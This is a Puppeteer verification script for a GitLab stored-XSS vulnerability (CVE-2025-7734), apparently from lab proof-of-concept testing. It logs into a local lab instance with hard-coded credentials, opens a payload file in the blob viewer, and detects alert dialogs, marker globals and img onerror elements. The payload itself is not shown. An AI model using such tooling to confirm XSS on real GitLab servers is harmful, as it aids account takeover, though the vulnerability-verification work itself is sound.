// CVE-2025-7734 Browser Verification via Puppeteer
// Runs inside a Docker container with a full Chromium browser
const puppeteer = require('puppeteer');

const GITLAB_URL = process.env.GITLAB_URL || 'http://localhost:8880';
const HOST_HEADER = 'gitlab.local';
const USERNAME = 'root';
const PASSWORD = process.env.GITLAB_PASSWORD || 'LabPass2025!';
const PROJECT_PATH = process.env.PROJECT_PATH || 'root/xss-poc';

(async () => {
  console.log('=== CVE-2025-7734 Browser Verification ===');
  console.log(`Target: ${GITLAB_URL}`);

  const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security'],
    executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
  });

  const page = await browser.newPage();
  await page.setExtraHTTPHeaders({ 'Host': HOST_HEADER });

  // Track XSS signals
  let xssTriggered = false;
  let xssDetails = [];

  page.on('dialog', async dialog => {
    xssTriggered = true;
    xssDetails.push(`ALERT: ${dialog.message()}`);
    console.log(`ðŸš¨ XSS ALERT: "${dialog.message()}"`);
    await dialog.accept();
  });

  page.on('console', msg => {
    if (msg.text().includes('XSS') || msg.text().includes('xss')) {
      console.log(`Console: ${msg.text()}`);
    }
  });

  try {
    // Login
    console.log('[*] Logging in...');
    await page.goto(`${GITLAB_URL}/users/sign_in`, { waitUntil: 'networkidle2', timeout: 60000 });
    await page.type('#user_login', USERNAME);
    await page.type('#user_password', PASSWORD);
    await page.click('input[type="submit"], button[type="submit"]');
    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {});
    console.log(`[+] Logged in. URL: ${page.url()}`);

    // Navigate to blob viewer
    const blobUrl = `${GITLAB_URL}/${PROJECT_PATH}/-/blob/main/payload.py`;
    console.log(`[*] Opening blob viewer: ${blobUrl}`);
    await page.goto(blobUrl, { waitUntil: 'networkidle2', timeout: 60000 });

    // Wait for code navigation to process
    console.log('[*] Waiting for code navigation JS...');
    await new Promise(r => setTimeout(r, 8000));

    // Check for XSS markers in the DOM
    const results = await page.evaluate(() => {
      const markers = {
        xss_marker: window.__xss_marker || null,
        xss_marker2: window.__xss_marker2 || null,
      };

      // Check for injected elements in code content
      const codeBlock = document.querySelector('.blob-content, .file-content, #blob-content-holder, .js-syntax-highlight');
      if (codeBlock) {
        markers.injectedImgs = codeBlock.querySelectorAll('img').length;
        markers.injectedSvgs = codeBlock.querySelectorAll('svg:not([class*="gl-"])').length;
        markers.codeBlockHTML = codeBlock.innerHTML.substring(0, 1000);
      }

      // Check all img tags on page for XSS-injected ones
      const allImgs = document.querySelectorAll('img[onerror], img[src=""]');
      markers.xssImgs = allImgs.length;

      return markers;
    });

    console.log(`\n[*] DOM Analysis Results:`);
    console.log(`  XSS Marker 1: ${results.xss_marker || 'not set'}`);
    console.log(`  XSS Marker 2: ${results.xss_marker2 || 'not set'}`);
    console.log(`  Injected <img>: ${results.injectedImgs || 0}`);
    console.log(`  Injected <svg>: ${results.injectedSvgs || 0}`);
    console.log(`  XSS <img> elements: ${results.xssImgs || 0}`);

    if (results.xss_marker || results.xss_marker2 || results.xssImgs > 0) {
      xssTriggered = true;
    }

    // Take screenshot
    await page.screenshot({ path: '/output/xss_evidence.png', fullPage: true });
    console.log('[*] Screenshot saved to /output/xss_evidence.png');

    // Save DOM dump
    const pageContent = await page.content();
    require('fs').writeFileSync('/output/page_dump.html', pageContent);
    console.log('[*] Page HTML saved to /output/page_dump.html');

    if (xssTriggered) {
      console.log('\nâœ… CVE-2025-7734 CONFIRMED: XSS triggered in browser!');
      process.exit(0);
    } else {
      console.log('\nâš ï¸  XSS not directly triggered in headless browser');
      console.log('   (Code navigation may require additional DOM interactions)');
      console.log('   Code block HTML:', results.codeBlockHTML?.substring(0, 300) || 'N/A');
      process.exit(2);
    }

  } catch (e) {
    console.error(`[!] Error: ${e.message}`);
    await page.screenshot({ path: '/output/error.png', fullPage: true }).catch(() => {});
    process.exit(1);
  } finally {
    await browser.close();
  }
})();
